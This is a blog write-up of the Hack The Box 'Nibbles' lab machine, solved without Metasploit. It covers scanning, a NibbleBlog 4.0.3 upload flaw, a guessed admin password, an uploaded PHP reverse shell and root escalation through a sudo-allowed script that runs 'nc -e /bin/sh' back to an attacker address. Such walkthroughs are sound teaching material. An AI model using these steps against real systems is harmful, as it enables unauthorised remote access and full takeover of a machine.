<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>HTB - Nibbles without MetaSploit - Masoopy</title><meta name=description content><meta property="og:title" content="HTB - Nibbles without MetaSploit"><meta property="og:description" content="Intro Easy box, according to HTB notation, also not a very good user&rsquo;s rating. Let&rsquo;s see what it is about!
Target HTB - Nibbles
Recon Quick recon according to logo and info :
 Linux box ; Misc : web, misconfiguration.  Enum Classic nmap scan :
1  sudo nmap -T4 -A -p- -oA scan $target_ip   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  Starting Nmap 7."><meta property="og:type" content="article"><meta property="og:url" content="https://www.masoopy.com/htb-nibbles-without-metasploit/"><meta property="article:published_time" content="2021-02-17T00:00:00+00:00"><meta property="article:modified_time" content="2021-02-17T00:00:00+00:00"><meta property="og:site_name" content="Masoopy"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB - Nibbles without MetaSploit"><meta name=twitter:description content="Intro Easy box, according to HTB notation, also not a very good user&rsquo;s rating. Let&rsquo;s see what it is about!
Target HTB - Nibbles
Recon Quick recon according to logo and info :
 Linux box ; Misc : web, misconfiguration.  Enum Classic nmap scan :
1  sudo nmap -T4 -A -p- -oA scan $target_ip   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  Starting Nmap 7."><meta name=application-name content="Masoopy"><meta name=apple-mobile-web-app-title content="Masoopy"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://www.masoopy.com/htb-nibbles-without-metasploit/><link rel=prev href=https://www.masoopy.com/htb-devel-without-metasploit/><link rel=next href=https://www.masoopy.com/thm-hackpark-without-metasploit/><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/style.min.css><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HTB - Nibbles without MetaSploit","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.masoopy.com\/htb-nibbles-without-metasploit\/"},"genre":"posts","keywords":"HTB","wordcount":936,"url":"https:\/\/www.masoopy.com\/htb-nibbles-without-metasploit\/","datePublished":"2021-02-17T00:00:00+00:00","dateModified":"2021-02-17T00:00:00+00:00","publisher":{"@type":"Organization","name":"Denis G."},"author":{"@type":"Person","name":"Denis G."},"description":""}</script></head><body header-desktop header-mobile><script type=text/javascript>(''==='true'&&window.localStorage&&localStorage.getItem('theme')?localStorage.getItem('theme')==='dark':(''==='auto'?window.matchMedia('(prefers-color-scheme: dark)').matches:''==='dark'))&&document.body.setAttribute('theme','dark');</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Masoopy>Masoopy</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=https://cheatsheets.masoopy.com/ rel="noopener noreferrer" target=_blank>Cheatsheets </a><a class=menu-item href=/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item language" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
<select class=language-select id=language-select-desktop onchange="location=this.value;"><option value=/htb-nibbles-without-metasploit/ selected>English</option></select>
</a><span class="menu-item search" id=search-desktop><input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Masoopy>Masoopy</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw"></i></a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw"></i></a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/>Posts</a><a class=menu-item href=/tags/>Tags</a><a class=menu-item href=/categories/>Categories</a><a class=menu-item href=https://cheatsheets.masoopy.com/ rel="noopener noreferrer" target=_blank>Cheatsheets</a><a class=menu-item href=/about/>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i></a><a href=javascript:void(0); class=menu-item title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
<select class=language-select onchange="location=this.value;"><option value=/htb-nibbles-without-metasploit/ selected>English</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animated flipInX">HTB - Nibbles without MetaSploit</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw"></i>Denis G.</a></span>&nbsp;<span class=post-category>included in <a href=/categories/hacking/><i class="far fa-folder fa-fw"></i>hacking</a>&nbsp;<a href=/categories/write-ups/><i class="far fa-folder fa-fw"></i>write-ups</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2021-02-17>2021-02-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;936 words&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div></div><div class=featured-image><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_Logo.png data-srcset="/images/2021/02/Nibbles_Logo.png, /images/2021/02/Nibbles_Logo.png 1.5x, /images/2021/02/Nibbles_Logo.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_Logo.png title=/images/2021/02/Nibbles_Logo.png></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#intro>Intro</a></li><li><a href=#target>Target</a></li><li><a href=#recon>Recon</a></li><li><a href=#enum>Enum</a><ul><li><a href=#web-scanning>Web scanning</a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#getting-initial-shell>Getting initial shell</a></li><li><a href=#privesc>PrivEsc</a></li></ul></li><li><a href=#outro>Outro</a></li></ul></nav></div></div><div class=content id=content><h2 id=intro>Intro</h2><p>Easy box, according to HTB notation, also not a very good user&rsquo;s rating. Let&rsquo;s see what it is about!</p><h2 id=target>Target</h2><p><a href=https://app.hackthebox.eu/machines/121 target=_blank rel="noopener noreferrer">HTB - Nibbles</a></p><h2 id=recon>Recon</h2><p>Quick recon according to logo and info :</p><ul><li>Linux box ;</li><li>Misc : web, misconfiguration.</li></ul><h2 id=enum>Enum</h2><p>Classic <code>nmap</code> scan :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>sudo nmap -T4 -A -p- -oA scan $target_ip
</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 16:42 CET
Nmap scan report for $target_ip
Host is up (0.023s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn&#39;t have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=2/17%OT=22%CT=1%CU=31405%PV=Y%DS=2%DC=T%G=Y%TM=602D399
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   23.69 ms 10.10.14.1
2   24.01 ms $target_ip

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.45 seconds
</code></pre></td></tr></table></div></div><h3 id=web-scanning>Web scanning</h3><p>Let&rsquo;s enumerate web folders in CLI, for a change :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>gobuster dir -u http://$target_ip -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php

</code></pre></td></tr></table></div></div><p>This won&rsquo;t give us much information, however by browsing to the website and checking its source we find a new URL :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_Check_Source.png data-srcset="/images/2021/02/Nibbles_Check_Source.png, /images/2021/02/Nibbles_Check_Source.png 1.5x, /images/2021/02/Nibbles_Check_Source.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_Check_Source.png title="Nibbles Check Source"></p><p>We fire <code>gobuster</code> one more time, with this new URL :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>gobuster dir -u http://$target_ip/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 200 -x .php

</code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://$target_ip/nibbleblog/
[+] Threads:        200
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2021/02/17 16:54:47 Starting gobuster
===============================================================
/themes (Status: 301)
/feed.php (Status: 200)
/admin (Status: 301)
/admin.php (Status: 200)
/plugins (Status: 301)
/install.php (Status: 200)
/update.php (Status: 200)
/languages (Status: 301)
/index.php (Status: 200)
/content (Status: 301)
/sitemap.php (Status: 200)
===============================================================
2021/02/17 16:55:21 Finished
===============================================================p
</code></pre></td></tr></table></div></div><p>It will reveal juicier info, such as <code>admin.php</code>, <code>install.php</code>, <code>sitemap</code>, etc.</p><p>Going to <code>install.php</code> will tell us the site is already installed and propose to upgrade it which will eventually leak <code>NibbleBlog version 4.0.3</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_Version.png data-srcset="/images/2021/02/Nibbles_Version.png, /images/2021/02/Nibbles_Version.png 1.5x, /images/2021/02/Nibbles_Version.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_Version.png title="Nibbles Version"></p><p>By checking source code on Github, we also find juicy directory in <code>/content/private</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_Dir_List.png data-srcset="/images/2021/02/Nibbles_Dir_List.png, /images/2021/02/Nibbles_Dir_List.png 1.5x, /images/2021/02/Nibbles_Dir_List.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_Dir_List.png title="Nibbles Directory Listing"></p><p>Now checking <code>searchsploit</code> we find that our version is vulnerable to <a href=https://www.exploit-db.com/exploits/38489 target=_blank rel="noopener noreferrer">Authenticated Arbitrary File Upload</a>. It means we need to get the credentials.</p><p>By looking inside the users.xml file we can suppose that <code>admin</code> is the login.</p><h2 id=exploitation>Exploitation</h2><p>Now, we could try to brute force the admin area, however it won&rsquo;t be effective since Nibbleblog will temporarily block our IP after a few attempts:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_WAF.png data-srcset="/images/2021/02/Nibbles_WAF.png, /images/2021/02/Nibbles_WAF.png 1.5x, /images/2021/02/Nibbles_WAF.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_WAF.png title="Nibbles WAF"></p><p>Here, again, I spent way more time than I care to admit. You have to find the password, but can&rsquo;t &ldquo;crack&rdquo; it which means we have to guess it. I tried a lot of stuff&mldr; but couldn&rsquo;t find it, so I cheated&mldr; again!</p><p>We know the password is <code>admin</code>, and the password is <code>nibbles</code>, like the box&rsquo;s name (which I tried), but I uesd a capital <code>N</code>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_Admin_Area.png data-srcset="/images/2021/02/Nibbles_Admin_Area.png, /images/2021/02/Nibbles_Admin_Area.png 1.5x, /images/2021/02/Nibbles_Admin_Area.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_Admin_Area.png title="Nibbles Admin Area"></p><p>Now that we have our credentials, we can finally start playing with the CVE we found earlier! Since, we are trying to solve this without MetaSploit, we need to find a <a href=https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html target=_blank rel="noopener noreferrer">manual way</a> to exploit our target.</p><h3 id=getting-initial-shell>Getting initial shell</h3><p>Let&rsquo;s create a [php shell(https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)], thanks to Pentest Monkey and upload it via the Image plugin located at <code>http://$target_ip/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image</code>, then we will run shell my going to this URL : <code>http://$target_ip/nibbleblog/content/private/plugins/my_image/image.php</code>. The filename will always be <code>image.ext</code> with <code>ext</code> being the &ldquo;real&rdquo; extension.</p><p>NB : do not forget to start your listener : <code>nc -nlvp 1234</code>.</p><p>And we are in, unfortunately as <code>nibbler</code> and not <code>root</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_Initial_Shell.png data-srcset="/images/2021/02/Nibbles_Initial_Shell.png, /images/2021/02/Nibbles_Initial_Shell.png 1.5x, /images/2021/02/Nibbles_Initial_Shell.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_Initial_Shell.png title="Nibbles Initial Shell"></p><p>Let&rsquo;s still grab the user flag :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_User_Flag.png data-srcset="/images/2021/02/Nibbles_User_Flag.png, /images/2021/02/Nibbles_User_Flag.png 1.5x, /images/2021/02/Nibbles_User_Flag.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_User_Flag.png title="Nibbles User Flag"></p><p>And now&mldr; we need to escalate our priv!</p><h3 id=privesc>PrivEsc</h3><p>Before we can have a chance to elevate our privs, we should do more <a href=https://www.masoopy.com/cheatsheets/got-shell/ target=_blank rel="noopener noreferrer">internal recon</a>.</p><p>We&rsquo;ll upload <a href=https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh target=_blank rel="noopener noreferrer">LSE</a>, in order to check for any &ldquo;entry points&rdquo; to privileges escalation.</p><p>We will serve our script via <code>sudo python2 -m SimpleHTTPServer 80</code> since our target doesn&rsquo;t seem to resolve Github&rsquo;s domain&rsquo;s and download it with <code>curl</code>.</p><p>Once it downloaded, give it exec right, then run it. Something interesting will come up :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_LSE_Sudo.png data-srcset="/images/2021/02/Nibbles_LSE_Sudo.png, /images/2021/02/Nibbles_LSE_Sudo.png 1.5x, /images/2021/02/Nibbles_LSE_Sudo.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_LSE_Sudo.png title="Nibbles LSE Sudo"></p><p>This means that we&rsquo;ll be able to run anything as <code>root</code> as long as it is in <code>/home/nibbler/personal/stuff/monitor.sh</code>.</p><p>All right! Let&rsquo;s try to run a reverse shell :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>cd /home/nibbler
echo &#34;#!/bin/bash&#34; &gt; personal/stuff/monitor.sh
echo &#34;nc -e &#34;/bin/sh&#34; $attacking_ip 1235&#34; &gt;&gt; personal/stuff/monitor.sh
chmod +x personal/stuff/monitor.sh
</code></pre></td></tr></table></div></div><p>Now we run it :</p><p><code>sudo /home/nibbler/personal/stuff/monitor.sh</code></p><p>NB : don&rsquo;t forget to start the listener on your attacking machine.</p><p>And that&rsquo;s it, we have root :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_Root_Shell.png data-srcset="/images/2021/02/Nibbles_Root_Shell.png, /images/2021/02/Nibbles_Root_Shell.png 1.5x, /images/2021/02/Nibbles_Root_Shell.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_Root_Shell.png title="Nibbles Root Shell"></p><p>And we grab the last flag :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/Nibbles_Root_Flag.png data-srcset="/images/2021/02/Nibbles_Root_Flag.png, /images/2021/02/Nibbles_Root_Flag.png 1.5x, /images/2021/02/Nibbles_Root_Flag.png 2x" data-sizes=auto alt=/images/2021/02/Nibbles_Root_Flag.png title="Nibbles Root Flag"></p><h2 id=outro>Outro</h2><p>Let me be blunt. Getting the admin&rsquo;s password sucked, and was no fun at all. By judging from the comments on the forum and the poor notation, I guess I wasn&rsquo;t the only one really frustrated while trying to get initial access. However, once I was in, while it was pretty easy, it was also super fun and really enjoyed this box!</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2021-02-17</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Share on Twitter" data-sharer=twitter data-url=https://www.masoopy.com/htb-nibbles-without-metasploit/ data-title="HTB - Nibbles without MetaSploit" data-via=nesousx data-hashtags=HTB><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="Share on Linkedin" data-sharer=linkedin data-url=https://www.masoopy.com/htb-nibbles-without-metasploit/><i class="fab fa-linkedin fa-fw"></i></a><a href=javascript:void(0); title="Share on Hacker News" data-sharer=hackernews data-url=https://www.masoopy.com/htb-nibbles-without-metasploit/ data-title="HTB - Nibbles without MetaSploit"><i class="fab fa-hacker-news fa-fw"></i></a><a href=javascript:void(0); title="Share on Reddit" data-sharer=reddit data-url=https://www.masoopy.com/htb-nibbles-without-metasploit/><i class="fab fa-reddit fa-fw"></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/htb/>HTB</a></section><section><span><a href=javascript:void(0); onclick=window.history.back();>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/htb-devel-without-metasploit/ class=prev rel=prev title="HTB - Devel without MetaSploit"><i class="fas fa-angle-left fa-fw"></i>HTB - Devel without MetaSploit</a>
<a href=/thm-hackpark-without-metasploit/ class=next rel=next title="THM - HackPark without MetaSploit">THM - HackPark without MetaSploit<i class="fas fa-angle-right fa-fw"></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreferrer" title="Hugo 0.79.1">Hugo</a> | Theme - <a href=https://github.com/sunt-programator/CodeIT target=_blank rel="noopener noreferrer" title="CodeIT 0.2.10"><i class="fas fa-laptop-code fa-fw"></i>CodeIT</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer">Denis G.</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i></a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type=text/javascript src=/js/theme.min.js></script></body></html>